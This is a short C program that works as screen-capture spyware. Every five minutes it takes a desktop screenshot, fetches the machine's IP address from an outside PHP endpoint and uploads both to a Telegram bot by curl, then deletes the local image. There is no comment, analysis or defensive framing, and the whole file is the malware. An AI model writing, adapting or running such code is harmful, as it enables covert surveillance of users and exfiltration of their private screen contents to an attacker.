#include <stdlib.h>
#include <string.h>
	int main(){
	char code[5000];
		while(1==1){
		system("gnome-screenshot -f /tmp/ehuehue.png | :");
		strcat(code,"caption=\"$(curl http://haydo.esy.es/workspace/AliRiza/ip.php)\";");
		strcat(code,"curl -s -X POST \"https://api.telegram.org/bot<token>/sendPhoto\" -F chat_id=\"<chatid>\" -F photo=\"@/tmp/ehuehue.png\" -F caption=$caption");
		system(code);
		system("rm -f /tmp/ehuehue.png | :");
		system("sleep 300 | :");
		strcpy(code,"");
	}
}
